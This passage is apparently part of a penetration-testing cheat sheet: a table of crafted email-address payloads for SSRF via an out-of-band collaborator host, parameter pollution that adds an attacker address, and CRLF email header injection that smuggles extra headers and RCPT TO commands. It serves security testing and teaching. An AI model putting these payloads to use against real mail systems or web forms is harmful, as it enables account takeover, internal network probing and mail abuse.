...
| SSRF                     | <p><a href="mailto:john.doe@abc123.burpcollaborator.net">john.doe@abc123.burpcollaborator.net</a></p><p>john.doe@[127.0.0.1]</p>                                 |
| Parameter Pollution      | victim\&email=[attacker@example.com](mailto:attacker@example.com)                                                                                                |
| (Email) Header Injection | <p>"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com</p><p>"<a href="mailto:recipient@test.com">recipient@test.com</a>>\r\nRCPT TO:&#x3C;victim+"@test.com</p> |
